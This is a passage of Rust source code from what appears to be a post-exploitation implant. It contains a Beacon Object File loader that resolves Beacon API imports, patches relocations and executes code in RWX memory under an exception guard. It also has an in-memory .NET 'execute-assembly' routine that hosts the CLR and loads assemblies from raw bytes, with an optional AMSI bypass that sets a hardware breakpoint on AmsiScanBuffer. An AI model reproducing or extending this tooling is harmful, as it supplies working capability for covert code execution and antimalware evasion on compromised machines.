            ($map:expr, $name:literal, $fn:expr) => {{
                let addr = $fn as usize;
                let n = crate::s!($name);
                let imp = format!("__imp_{}", &n);
                // direct call → thunk; __imp_ → GOT slot
                $map.insert(n, thunk_alloc(addr));
                $map.insert(imp, got_alloc_slot(addr));
            }};
        }
        reg_beacon!(resolved, "BeaconPrintf",         beacon_api::beacon_printf);
        reg_beacon!(resolved, "BeaconOutput",         beacon_api::beacon_output);
        reg_beacon!(resolved, "BeaconDataParse",      beacon_api::beacon_data_parse);
        reg_beacon!(resolved, "BeaconDataInt",        beacon_api::beacon_data_int);
        reg_beacon!(resolved, "BeaconDataShort",      beacon_api::beacon_data_short);
        reg_beacon!(resolved, "BeaconDataLength",     beacon_api::beacon_data_length);
        reg_beacon!(resolved, "BeaconDataExtract",    beacon_api::beacon_data_extract);
        reg_beacon!(resolved, "BeaconFormatAlloc",    beacon_api::beacon_format_alloc);
        reg_beacon!(resolved, "BeaconFormatFree",     beacon_api::beacon_format_free);
        reg_beacon!(resolved, "BeaconFormatAppend",   beacon_api::beacon_format_append);
        reg_beacon!(resolved, "BeaconFormatPrintf",   beacon_api::beacon_format_printf);
        reg_beacon!(resolved, "BeaconFormatToString", beacon_api::beacon_format_to_string);
        reg_beacon!(resolved, "BeaconFormatInt",      beacon_api::beacon_format_int);
        reg_beacon!(resolved, "BeaconFormatReset",    beacon_api::beacon_format_reset);
        reg_beacon!(resolved, "BeaconIsAdmin",        beacon_api::beacon_is_admin);
        reg_beacon!(resolved, "BeaconGetSpawnTo",     beacon_api::beacon_get_spawn_to);
        reg_beacon!(resolved, "toWideChar",           beacon_api::to_wide_char);
    }

    // Resolve DLL imports
    let mut unresolved: Vec<String> = Vec::new();
    for sym in symbols.values() {
        if sym.sec_num != 0 || sym.class != 2 { continue; }
        if resolved.contains_key(&sym.name) { continue; }
        let is_imp = sym.name.starts_with("__imp_");
        let imp_name = sym.name.strip_prefix("__imp_").unwrap_or(&sym.name);
        if let Some(dp) = imp_name.find('$') {
            let module = &imp_name[..dp];
            let func = &imp_name[dp+1..];
            unsafe {
                use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
                let mname = format!("{}.dll\0", module);
                let mut h = GetModuleHandleA(mname.as_ptr());
                if h == 0 { h = crate::dynapi::load_library_a(mname.as_ptr()) as _; }
                if h != 0 {
                    let fname = format!("{}\0", func);
                    if let Some(a) = GetProcAddress(h, fname.as_ptr()) {
                        let addr = a as usize;
                        if is_imp {
                            let slot = got_alloc_slot(addr);
                            resolved.insert(sym.name.clone(), slot);
                            crate::dlog!("bof", "resolved {}!{} -> 0x{:x} (GOT 0x{:x})", module, func, addr, slot);
                        } else {
                            let stub = thunk_alloc(addr);
                            resolved.insert(sym.name.clone(), stub);
                            crate::dlog!("bof", "resolved {}!{} -> 0x{:x} (thunk 0x{:x})", module, func, addr, stub);
                        }
                    } else {
                        crate::dlog!("bof", "UNRESOLVED import: {}!{}", module, func);
                        unresolved.push(format!("{}!{}", module, func));
                    }
                } else {
                    crate::dlog!("bof", "UNRESOLVED module: {}", module);
                    unresolved.push(format!("{}!{} (module not found)", module, func));
                }
            }
        } else {
            crate::dlog!("bof", "UNRESOLVED extern: {}", sym.name);
            unresolved.push(sym.name.clone());
        }
    }
    if !unresolved.is_empty() {
        crate::dlog!("bof", "{} unresolved symbol(s)", unresolved.len());
    }
    crate::dlog!("bof", "resolved {} externals, GOT={} thunks={}", resolved.len(), got_count, thunk_count);

    // Apply relocations (skip .pdata/.xdata — we don't register exception tables)
    let mut reloc_count = 0usize;
    for (si_idx, sec) in sections.iter().enumerate() {
        if sec._name == ".pdata" || sec._name == ".xdata" { continue; }
        for r in 0..sec.nreloc {
            let ro = sec.reloc_off + r * 10;
            if ro + 10 > coff_data.len() { continue; }
            let va      = u32::from_le_bytes([coff_data[ro], coff_data[ro+1], coff_data[ro+2], coff_data[ro+3]]) as usize;
            let sym_idx = u32::from_le_bytes([coff_data[ro+4], coff_data[ro+5], coff_data[ro+6], coff_data[ro+7]]) as usize;
            let rtype   = u16::from_le_bytes([coff_data[ro+8], coff_data[ro+9]]);
            let sym = match symbols.get(&sym_idx) { Some(s) => s, None => { continue; } };

            let sym_addr: usize = if sym.sec_num > 0 {
                let ts = (sym.sec_num - 1) as usize;
                if ts < sec_ptrs.len() { sec_ptrs[ts] as usize + sym.value as usize } else { continue; }
            } else if let Some(&a) = resolved.get(&sym.name) { a }
            else { continue; };

            let sec_base = sec_ptrs[si_idx] as usize;
            if va + 4 > sec_sizes[si_idx] { continue; }
            let patch_addr = sec_base + va;
            unsafe {
                match rtype {
                    0x0001 => { // IMAGE_REL_AMD64_ADDR64
                        if va + 8 <= sec_sizes[si_idx] {
                            let cur = *(patch_addr as *const u64);
                            let result = cur.wrapping_add(sym_addr as u64);
                            *(patch_addr as *mut u64) = result;
                        }
                    }
                    0x0002 => { // IMAGE_REL_AMD64_ADDR32 — absolute 32-bit
                        let cur = *(patch_addr as *const u32);
                        let result = cur.wrapping_add(sym_addr as u32);
                        *(patch_addr as *mut u32) = result;
                    }
                    0x0003 => { // IMAGE_REL_AMD64_ADDR32NB — imagebase-relative 32-bit
                        // For COFF objects loaded at arbitrary addresses, this is
                        // an offset from a virtual "image base" of 0 — so the
                        // result is just the symbol's address truncated to 32 bits.
                        let cur = *(patch_addr as *const u32);
                        let result = cur.wrapping_add(sym_addr as u32);
                        *(patch_addr as *mut u32) = result;
                    }
                    0x0004 => { // IMAGE_REL_AMD64_REL32
                        let cur = *(patch_addr as *const i32);
                        let delta = sym_addr as i64 - (patch_addr as i64 + 4);
                        let result = cur as i64 + delta;
                        *(patch_addr as *mut i32) = result as i32;
                    }
                    0x0005..=0x0009 => { // IMAGE_REL_AMD64_REL32_1 .. REL32_5
                        let add = (rtype - 4) as i64;
                        let cur = *(patch_addr as *const i32);
                        let delta = sym_addr as i64 - (patch_addr as i64 + 4 + add);
                        let result = cur as i64 + delta;
                        *(patch_addr as *mut i32) = result as i32;
                    }
                    _ => {}
                }
            }
            reloc_count += 1;
        }
    }
    crate::dlog!("bof", "applied {} relocations", reloc_count);

    // Arena stays RWX — BOF sections share pages, so per-section
    // VirtualProtect would make .data read-only when it shares a
    // page with .text.  RWX for the arena lifetime is fine; it's
    // zeroed and freed immediately after go() returns.

    // Find go() entry
    let entry = symbols.values().find_map(|s| {
        if (s.name == "go" || s.name == "_go") && s.sec_num > 0 {
            let si = (s.sec_num - 1) as usize;
            if si < sec_ptrs.len() { Some(sec_ptrs[si] as usize + s.value as usize) } else { None }
        } else { None }
    });
    let entry = match entry {
        Some(a) => a,
        None => {
            unsafe { crate::dynapi::virtual_free(arena as _, 0, 0x8000); }
            return "[bof] No entry point 'go' found".to_string();
        }
    };
    crate::dlog!("bof", "entry 'go' at 0x{:x}", entry);

    // Pack args
    let packed = _bof_pack_args(args);
    crate::dlog!("bof", "packed args len={}", packed.len());

    // Call go(char* args, int len)
    crate::dlog!("bof", "calling go()...");
    let crashed = unsafe { _bof_call_guarded(entry, packed.as_ptr(), packed.len() as i32) };
    if crashed != 0 {
        crate::dlog!("bof", "go() CRASHED with exception 0x{:08x}", crashed);
        unsafe {
            core::ptr::write_bytes(arena, 0, total_size);
            crate::dynapi::virtual_free(arena as _, 0, 0x8000);
        }
        return format!("[bof] Exception 0x{:08X} during execution", crashed);
    }
    crate::dlog!("bof", "go() returned OK");

    // Cleanup
    unsafe {
        core::ptr::write_bytes(arena, 0, total_size);
        crate::dynapi::virtual_free(arena as _, 0, 0x8000); // MEM_RELEASE
    }

    let out = output_buf.lock().unwrap();
    if out.is_empty() { "[bof] OK (no output)".to_string() }
    else { String::from_utf8_lossy(&out).to_string() }
}

#[cfg(windows)]
#[repr(C)]
struct BofCallArgs {
    entry:    usize,
    args_ptr: *const u8,
    args_len: i32,
}
#[cfg(windows)]
unsafe impl Send for BofCallArgs {}
#[cfg(windows)]
unsafe impl Sync for BofCallArgs {}

#[cfg(windows)]
static GUARDED_THREAD_ID: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
#[cfg(windows)]
static GUARDED_CRASH_CODE: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

#[cfg(windows)]
unsafe extern "system" fn _guarded_veh_handler(info: *mut std::ffi::c_void) -> i32 {
    // Only handle exceptions from the BOF thread
    extern "system" { fn GetCurrentThreadId() -> u32; }
    let tid = GetCurrentThreadId();
    let bof_tid = GUARDED_THREAD_ID.load(std::sync::atomic::Ordering::Relaxed);
    if tid != bof_tid || bof_tid == 0 {
        return 0; // EXCEPTION_CONTINUE_SEARCH — not our thread
    }

    #[repr(C)]
    struct ExcPtrs { rec: *mut ExcRec, ctx: *mut u8 }
    #[repr(C)]
    struct ExcRec { code: u32, _flags: u32, _chain: *mut ExcRec, _addr: usize,
                    _nparams: u32, _pad: u32, info: [usize; 2] }

    let ptrs = &mut *(info as *mut ExcPtrs);
    let code = (*ptrs.rec).code;

    // Only intercept truly fatal NT exceptions (0xC0000xxx).
    // Let everything else propagate — COM/RPC/SEH use codes like
    // 0x000006BA (RPC_S_SERVER_UNAVAILABLE) that their own __except
    // handlers need to catch and handle normally.
    if code < 0xC0000000 {
        return 0; // EXCEPTION_CONTINUE_SEARCH
    }

    GUARDED_CRASH_CODE.store(code, std::sync::atomic::Ordering::Relaxed);
    let fault_addr = (*ptrs.rec)._addr;
    let rip = *(ptrs.ctx.add(0xF8) as *const u64);
    if code == 0xc0000005 {
        let rw = (*ptrs.rec).info[0]; // 0=read, 1=write, 8=DEP
        let target = (*ptrs.rec).info[1];
        crate::dlog!("bof", "VEH ACCESS_VIOLATION at rip=0x{:x} fault=0x{:x} {}=0x{:x}",
            rip, fault_addr, if rw == 0 { "read" } else if rw == 1 { "write" } else { "DEP" }, target);
    } else {
        crate::dlog!("bof", "VEH caught 0x{:08x} at rip=0x{:x}", code, rip);
    }

    extern "system" { fn ExitThread(code: u32) -> !; }
    let ctx_ptr = ptrs.ctx;
    // CONTEXT offsets on x86_64: Rcx=0x80, Rsp=0x98, Rip=0xF8
    let rip_ptr = ctx_ptr.add(0xF8) as *mut u64;
    let rcx_ptr = ctx_ptr.add(0x80) as *mut u64;
    let rsp_ptr = ctx_ptr.add(0x98) as *mut u64;
    *rip_ptr = ExitThread as u64;
    *rcx_ptr = code as u64; // ExitThread(exception_code)
    // Align stack to 16 bytes for x64 ABI
    let rsp = *rsp_ptr;
    *rsp_ptr = (rsp & !0xF) - 8;
    -1 // EXCEPTION_CONTINUE_EXECUTION — resume at ExitThread
}

#[cfg(windows)]
unsafe extern "system" fn _bof_thread_proc(param: *mut std::ffi::c_void) -> u32 {
    extern "system" { fn GetCurrentThreadId() -> u32; }
    GUARDED_THREAD_ID.store(GetCurrentThreadId(), std::sync::atomic::Ordering::Relaxed);
    GUARDED_CRASH_CODE.store(0, std::sync::atomic::Ordering::Relaxed);
    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        let ctx = &*(param as *const BofCallArgs);
        type GoFn = unsafe extern "C" fn(*const u8, i32);
        let go: GoFn = std::mem::transmute(ctx.entry);
        go(ctx.args_ptr, ctx.args_len);
    }));
    GUARDED_THREAD_ID.store(0, std::sync::atomic::Ordering::Relaxed);
    match result {
        Ok(_) => 0,
        Err(_) => {
            crate::dlog!("bof", "go() panicked (Rust panic caught)");
            0xDEAD0003
        }
    }
}

#[cfg(windows)]
unsafe fn _bof_call_guarded(entry: usize, args_ptr: *const u8, args_len: i32) -> u32 {
    extern "system" {
        fn AddVectoredExceptionHandler(first: u32, handler: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32) -> *mut std::ffi::c_void;
        fn RemoveVectoredExceptionHandler(handle: *mut std::ffi::c_void) -> u32;
        fn GetExitCodeThread(h: isize, code: *mut u32) -> i32;
    }
    let veh = AddVectoredExceptionHandler(1, _guarded_veh_handler);

    let ctx = BofCallArgs { entry, args_ptr, args_len };
    let h = crate::dynapi::create_thread(
        std::ptr::null_mut(), 0,
        _bof_thread_proc,
        &ctx as *const _ as *mut std::ffi::c_void,
        0, std::ptr::null_mut(),
    );
    if h == 0 {
        RemoveVectoredExceptionHandler(veh);
        GUARDED_THREAD_ID.store(0, std::sync::atomic::Ordering::Relaxed);
        crate::dlog!("bof", "CreateThread failed");
        return 0xDEAD0001;
    }
    crate::dynapi::wait_for_single_object(h, 60_000);
    let mut exit_code: u32 = 0;
    GetExitCodeThread(h, &mut exit_code);
    crate::dynapi::close_handle(h);
    RemoveVectoredExceptionHandler(veh);
    GUARDED_THREAD_ID.store(0, std::sync::atomic::Ordering::Relaxed);

    // Check if VEH caught a crash
    let crash_code = GUARDED_CRASH_CODE.load(std::sync::atomic::Ordering::Relaxed);
    if crash_code != 0 {
        crate::dlog!("bof", "VEH reported crash 0x{:08x}", crash_code);
        return crash_code;
    }
    if exit_code == 259 { // STILL_ACTIVE — BOF hung for >60s
        crate::dlog!("bof", "go() timed out (60s)");
        return 0xDEAD0002;
    }
    exit_code
}

#[cfg(windows)]
fn _coff_strtab(data: &[u8], off: usize) -> String {
    if off >= data.len() { return String::new(); }
    let end = data[off..].iter().position(|&b| b == 0).unwrap_or(0);
    String::from_utf8_lossy(&data[off..off+end]).to_string()
}

#[cfg(windows)]
fn _bof_pack_args(args: &str) -> Vec<u8> {
    if args.is_empty() { return vec![0, 0, 0, 0]; }
    let sb = args.as_bytes();
    let entry_len = (sb.len() + 1) as u32;
    let total = (4 + sb.len() + 1) as u32;
    let mut buf = Vec::with_capacity(4 + total as usize);
    buf.extend_from_slice(&total.to_le_bytes());
    buf.extend_from_slice(&entry_len.to_le_bytes());
    buf.extend_from_slice(sb);
    buf.push(0);
    buf
}

// ══════════════════════════════════════════════════════════════════════════════
// EXECUTE-ASSEMBLY — Windows (.NET CLR Hosting)
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
fn _assembly_exec_windows(assembly_bytes: &[u8], args: &str, amsi_bypass: bool) -> String {
    use std::ptr;
    use std::os::windows::ffi::OsStrExt;
    use std::ffi::OsStr;

    if assembly_bytes.len() >= 4 {
        crate::dlog!("assembly", "header: {:02x} {:02x} {:02x} {:02x} (len={})",
            assembly_bytes[0], assembly_bytes[1], assembly_bytes[2], assembly_bytes[3],
            assembly_bytes.len());
    }

    // Validate MZ header
    if assembly_bytes.len() < 2 || assembly_bytes[0] != 0x4D || assembly_bytes[1] != 0x5A {
        return "[assembly] ERROR: not a valid PE file (missing MZ header)".to_string();
    }

    unsafe {
        use windows_sys::Win32::System::Com::CoInitializeEx;
        CoInitializeEx(ptr::null(), 0);
    }

    unsafe {
        use windows_sys::Win32::System::LibraryLoader::GetProcAddress;

        let mscoree_name = sb!("mscoree.dll");
        let mscoree = crate::dynapi::load_library_a(mscoree_name.as_ptr()) as isize;
        if mscoree == 0 {
            return "[assembly] Failed to load mscoree.dll — .NET not installed?".to_string();
        }

        let clr_fn_name = sb!("CLRCreateInstance");
        let clr_create = GetProcAddress(mscoree as _, clr_fn_name.as_ptr());
        if clr_create.is_none() {
            return "[assembly] CLRCreateInstance not found".to_string();
        }

        // CLRCreateInstance → ICLRMetaHost
        // CLSID_CLRMetaHost = {9280188D-0E8E-4867-B30C-7FA83884E8DE}
        let clsid_meta: [u8; 16] = [0x8d,0x18,0x80,0x92,0x8e,0x0e,0x67,0x48,0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde];
        // IID_ICLRMetaHost = {D332DB9E-B9B3-4125-8207-A14884F53216}
        let iid_meta: [u8; 16] = [0x9e,0xdb,0x32,0xd3,0xb3,0xb9,0x25,0x41,0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16];

        type CLRCreateFn = unsafe extern "system" fn(*const u8, *const u8, *mut *mut std::ffi::c_void) -> i32;
        let clr_create: CLRCreateFn = std::mem::transmute(clr_create.unwrap());
        let mut meta_host: *mut std::ffi::c_void = ptr::null_mut();

        crate::dlog!("assembly", "mscoree=0x{:x} CLRCreateInstance=0x{:x}",
            mscoree as usize, clr_create as usize);
        crate::dlog!("assembly", "clsid={:02x?}", &clsid_meta);
        crate::dlog!("assembly", "iid={:02x?}", &iid_meta);

        let hr = clr_create(clsid_meta.as_ptr(), iid_meta.as_ptr(), &mut meta_host);
        crate::dlog!("assembly", "CLRCreateInstance hr=0x{:08x} meta_host=0x{:x}",
            hr as u32, meta_host as usize);
        if hr < 0 {
            return format!("[assembly] CLRCreateInstance failed: 0x{:08x} (clsid={:02x}{:02x}{:02x}{:02x})",
                hr as u32, clsid_meta[0], clsid_meta[1], clsid_meta[2], clsid_meta[3]);
        }

        // GetRuntime v4.0.30319
        crate::dlog!("assembly", "calling GetRuntime...");
        let vt = *(meta_host as *const *const usize);
        let get_runtime: unsafe extern "system" fn(*mut std::ffi::c_void, *const u16, *const u8, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(3));
        let clr_ver = s!("v4.0.30319");
        let ver: Vec<u16> = OsStr::new(&clr_ver).encode_wide().chain(std::iter::once(0)).collect();
        // IID_ICLRRuntimeInfo = {BD39D1D2-BA2F-486A-89B0-B4B0CB466891}
        let iid_ri: [u8; 16] = [0xd2,0xd1,0x39,0xbd,0x2f,0xba,0x6a,0x48,0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91];
        let mut ri: *mut std::ffi::c_void = ptr::null_mut();
        let hr = get_runtime(meta_host, ver.as_ptr(), iid_ri.as_ptr(), &mut ri);
        crate::dlog!("assembly", "GetRuntime hr=0x{:08x} ri=0x{:x}", hr as u32, ri as usize);
        if hr < 0 { return format!("[assembly] GetRuntime v4.0 failed: 0x{:08x}", hr as u32); }

        // ICLRRuntimeInfo::GetInterface → ICorRuntimeHost
        crate::dlog!("assembly", "calling GetInterface...");
        let vt = *(ri as *const *const usize);
        let get_iface: unsafe extern "system" fn(*mut std::ffi::c_void, *const u8, *const u8, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(9));
        // CLSID_CorRuntimeHost = {CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}
        let clsid_crh: [u8; 16] = [0x23,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e];
        // IID_ICorRuntimeHost = {CB2F6722-AB3A-11D2-9C40-00C04FA30A3E}
        let iid_crh: [u8; 16] = [0x22,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e];
        let mut rh: *mut std::ffi::c_void = ptr::null_mut();
        let hr = get_iface(ri, clsid_crh.as_ptr(), iid_crh.as_ptr(), &mut rh);
        crate::dlog!("assembly", "GetInterface hr=0x{:08x} rh=0x{:x}", hr as u32, rh as usize);
        if hr < 0 { return format!("[assembly] GetInterface failed: 0x{:08x}", hr as u32); }

        // Redirect stdout BEFORE CLR Start so Console.Out binds to our pipe
        use windows_sys::Win32::System::Pipes::CreatePipe;
        use windows_sys::Win32::System::Console::{SetStdHandle, GetStdHandle, STD_OUTPUT_HANDLE};
        use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};

        let mut rd = INVALID_HANDLE_VALUE;
        let mut wr = INVALID_HANDLE_VALUE;
        CreatePipe(&mut rd, &mut wr, ptr::null(), 0);
        let old_out = GetStdHandle(STD_OUTPUT_HANDLE);
        SetStdHandle(STD_OUTPUT_HANDLE, wr);

        // Start CLR
        crate::dlog!("assembly", "calling Start...");
        let vt = *(rh as *const *const usize);
        let start: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32 = std::mem::transmute(*vt.add(10));
        let hr = start(rh);
        crate::dlog!("assembly", "Start hr=0x{:08x}", hr as u32);
        if hr < 0 && hr != 1 {
            CloseHandle(wr);
            SetStdHandle(STD_OUTPUT_HANDLE, old_out);
            CloseHandle(rd);
            return format!("[assembly] CLR Start failed: 0x{:08x}", hr as u32);
        }

        // GetDefaultDomain
        crate::dlog!("assembly", "calling GetDefaultDomain...");
        let get_domain: unsafe extern "system" fn(*mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(13));
        let mut domain_unk: *mut std::ffi::c_void = ptr::null_mut();
        let hr = get_domain(rh, &mut domain_unk);
        crate::dlog!("assembly", "GetDefaultDomain hr=0x{:08x} domain=0x{:x}", hr as u32, domain_unk as usize);
        if hr < 0 { return format!("[assembly] GetDefaultDomain failed: 0x{:08x}", hr as u32); }

        // QI _AppDomain
        crate::dlog!("assembly", "calling QI _AppDomain...");
        // IID__AppDomain = {05F696DC-2B29-3663-AD8B-C4389CF2A713}
        let iid_ad: [u8; 16] = [0xdc,0x96,0xf6,0x05,0x29,0x2b,0x63,0x36,0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13];
        let qi: unsafe extern "system" fn(*mut std::ffi::c_void, *const u8, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*(*(domain_unk as *const *const usize)).add(0));
        let mut ad: *mut std::ffi::c_void = ptr::null_mut();
        let hr = qi(domain_unk, iid_ad.as_ptr(), &mut ad);
        crate::dlog!("assembly", "QI hr=0x{:08x} ad=0x{:x}", hr as u32, ad as usize);
        if hr < 0 { return format!("[assembly] QI _AppDomain failed: 0x{:08x}", hr as u32); }

        // Load + invoke ConsoleReset helper to rebind Console.Out to current STD_OUTPUT_HANDLE
        {
            static RESET_DLL: &[u8] = include_bytes!("../resources/console_reset.bin");
            let vt_r = *(ad as *const *const usize);
            let load_r: unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> i32
                = std::mem::transmute(*vt_r.add(45));
            let rb = SAFEARRAYBOUND { cElements: RESET_DLL.len() as u32, lLbound: 0 };
            let rsa = SafeArrayCreate(VT_UI1 as u16, 1, &rb);
            if !rsa.is_null() {
                let mut rp: *mut std::ffi::c_void = ptr::null_mut();
                SafeArrayAccessData(rsa, &mut rp);
                std::ptr::copy_nonoverlapping(RESET_DLL.as_ptr(), rp as *mut u8, RESET_DLL.len());
                SafeArrayUnaccessData(rsa);
                let mut rasm: *mut std::ffi::c_void = ptr::null_mut();
                let rhr = load_r(ad, rsa as *mut std::ffi::c_void, &mut rasm);
                SafeArrayDestroy(rsa);
                if rhr >= 0 && !rasm.is_null() {
                    let rvt = *(rasm as *const *const usize);
                    let rep: unsafe extern "system" fn(*mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> i32
                        = std::mem::transmute(*rvt.add(16));
                    let mut rmi: *mut std::ffi::c_void = ptr::null_mut();
                    if rep(rasm, &mut rmi) >= 0 && !rmi.is_null() {
                        let rivt = *(rmi as *const *const usize);
                        let rinv: unsafe extern "system" fn(*mut std::ffi::c_void, [u8; 16], *mut std::ffi::c_void, *mut [u8; 16]) -> i32
                            = std::mem::transmute(*rivt.add(37));
                        let empty_args: [&str; 0] = [];
                        let rparams = _build_invoke_params(&empty_args);
                        let _ = rinv(rmi, [0u8; 16], rparams, &mut [0u8; 16]);
                        if !rparams.is_null() { SafeArrayDestroy(rparams as *mut _); }
                    }
                }
                crate::dlog!("assembly", "ConsoleReset helper invoked");
            }
        }

        let amsi_hwbp: Option<AmsiHwbp> = if amsi_bypass {
            let bp = _amsi_hwbp_install();
            if bp.is_some() { crate::dlog!("assembly", "AMSI bypass: HW breakpoint set on AmsiScanBuffer"); }
            bp
        } else { None };

        // _AppDomain::Load_3 (SAFEARRAY* rawAssembly → _Assembly**) — vtable slot 45
        crate::dlog!("assembly", "preparing Load_3...");
        let vt = *(ad as *const *const usize);
        let load_3: unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(45));

        // Create SAFEARRAY for assembly bytes
        use windows_sys::Win32::System::Ole::{SafeArrayCreate, SafeArrayAccessData, SafeArrayUnaccessData, SafeArrayDestroy};
        use windows_sys::Win32::System::Com::SAFEARRAYBOUND;
        use windows_sys::Win32::System::Variant::VT_UI1;
        let bound = SAFEARRAYBOUND { cElements: assembly_bytes.len() as u32, lLbound: 0 };
        let sa = SafeArrayCreate(VT_UI1 as u16, 1, &bound);
        if sa.is_null() { return "[assembly] SafeArrayCreate failed".to_string(); }
        let mut raw: *mut std::ffi::c_void = ptr::null_mut();
        let sa_hr = SafeArrayAccessData(sa, &mut raw);
        crate::dlog!("assembly", "SafeArrayAccessData hr=0x{:08x} raw=0x{:x}", sa_hr as u32, raw as usize);
        std::ptr::copy_nonoverlapping(assembly_bytes.as_ptr(), raw as *mut u8, assembly_bytes.len());
        SafeArrayUnaccessData(sa);

        let sa_data = raw as *const u8;
        crate::dlog!("assembly", "SA data[0..4]: {:02x} {:02x} {:02x} {:02x}, last4: {:02x} {:02x} {:02x} {:02x}",
            *sa_data, *sa_data.add(1), *sa_data.add(2), *sa_data.add(3),
            *sa_data.add(assembly_bytes.len()-4), *sa_data.add(assembly_bytes.len()-3),
            *sa_data.add(assembly_bytes.len()-2), *sa_data.add(assembly_bytes.len()-1));
        crate::dlog!("assembly", "calling Load_3: sa=0x{:x} ad=0x{:x} vt[45]=0x{:x} len={}",
            sa as usize, ad as usize, *vt.add(45), assembly_bytes.len());
        let mut asm_obj: *mut std::ffi::c_void = ptr::null_mut();
        let hr = load_3(ad, sa as *mut std::ffi::c_void, &mut asm_obj);
        crate::dlog!("assembly", "Load_3 hr=0x{:08x} asm=0x{:x}", hr as u32, asm_obj as usize);
        SafeArrayDestroy(sa);
        if hr < 0 { return format!("[assembly] Assembly.Load failed: 0x{:08x}", hr as u32); }

        // _Assembly::get_EntryPoint — vtable slot 16
        crate::dlog!("assembly", "calling get_EntryPoint...");
        let vt = *(asm_obj as *const *const usize);
        let get_ep: unsafe extern "system" fn(*mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(16));
        let mut mi: *mut std::ffi::c_void = ptr::null_mut();
        let hr = get_ep(asm_obj, &mut mi);
        crate::dlog!("assembly", "get_EntryPoint hr=0x{:08x} mi=0x{:x}", hr as u32, mi as usize);
        if hr < 0 { return format!("[assembly] get_EntryPoint failed: 0x{:08x}", hr as u32); }

        // Build args SAFEARRAY (string[])
        let argv: Vec<&str> = if args.is_empty() { vec![] } else { args.split_whitespace().collect() };
        let params = _build_invoke_params(&argv);

        // Spawn reader thread to drain pipe — prevents deadlock when output > pipe buffer
        let reader = {
            let rd_handle = rd as usize;
            std::thread::spawn(move || {
                let rd = rd_handle as isize;
                let mut output = Vec::new();
                let mut rbuf = [0u8; 8192];
                loop {
                    let mut n = 0u32;
                    use windows_sys::Win32::Storage::FileSystem::ReadFile;
                    let ok = unsafe { ReadFile(rd, rbuf.as_mut_ptr() as _, rbuf.len() as u32, &mut n, std::ptr::null_mut()) };
                    if ok == 0 || n == 0 { break; }
                    output.extend_from_slice(&rbuf[..n as usize]);
                    if output.len() > 4 * 1024 * 1024 { break; }
                }
                output
            })
        };

        // _MethodInfo::Invoke_3 — vtable slot 37
        // VARIANT is 16 bytes on x64: 8-byte header (vt + 3 reserved WORDs) + 8-byte union
        crate::dlog!("assembly", "calling Invoke_3...");
        let vt = *(mi as *const *const usize);
        let invoke_3: unsafe extern "system" fn(*mut std::ffi::c_void, [u8; 16], *mut std::ffi::c_void, *mut [u8; 16]) -> i32
            = std::mem::transmute(*vt.add(37));
        let empty_var = [0u8; 16];
        let mut ret_var = [0u8; 16];
        let _hr = invoke_3(mi, empty_var, params, &mut ret_var);
        crate::dlog!("assembly", "Invoke_3 returned hr=0x{:08x}", _hr as u32);

        if let Some(bp) = amsi_hwbp {
            _amsi_hwbp_remove(bp);
            crate::dlog!("assembly", "AMSI bypass: HW breakpoint removed");
        }

        // Close write end so reader thread gets EOF, then collect output
        CloseHandle(wr);
        SetStdHandle(STD_OUTPUT_HANDLE, old_out);
        let output = reader.join().unwrap_or_default();
        CloseHandle(rd);
        if !params.is_null() { SafeArrayDestroy(params as *mut _); }

        let out_str = if output.is_empty() { String::new() } else { String::from_utf8_lossy(&output).to_string() };
        if _hr < 0 {
            if out_str.is_empty() {
                format!("[assembly] Invoke failed: 0x{:08x} (TargetInvocationException — the assembly threw an unhandled exception)", _hr as u32)
            } else {
                format!("{}\n\n[assembly] WARNING: Invoke returned 0x{:08x}", out_str, _hr as u32)
            }
        } else if out_str.is_empty() {
            "[assembly] OK (no output)".to_string()
        } else {
            out_str
        }
    }
}

#[cfg(windows)]
unsafe fn _build_invoke_params(argv: &[&str]) -> *mut std::ffi::c_void {
    use std::os::windows::ffi::OsStrExt;
    use std::ffi::OsStr;
    use windows_sys::Win32::System::Ole::{SafeArrayCreate, SafeArrayPutElement};
    use windows_sys::Win32::Foundation::SysAllocStringLen;
    use windows_sys::Win32::System::Com::SAFEARRAYBOUND;
    use windows_sys::Win32::System::Variant::VT_VARIANT;

    let outer_b = SAFEARRAYBOUND { cElements: 1, lLbound: 0 };
    let outer = SafeArrayCreate(VT_VARIANT as u16, 1, &outer_b);
    if outer.is_null() { return std::ptr::null_mut(); }

    let inner_b = SAFEARRAYBOUND { cElements: argv.len() as u32, lLbound: 0 };
    let inner = SafeArrayCreate(8u16 /* VT_BSTR */, 1, &inner_b);
    if !inner.is_null() {
        for (i, &a) in argv.iter().enumerate() {
            let w: Vec<u16> = OsStr::new(a).encode_wide().chain(std::iter::once(0)).collect();
            let bstr = SysAllocStringLen(w.as_ptr(), w.len() as u32 - 1);
            let idx = i as i32;
            SafeArrayPutElement(inner, &idx, bstr as *const _);
        }
    }

    // VARIANT holding VT_ARRAY|VT_BSTR (16 bytes on x64)
    let mut variant = [0u8; 16];
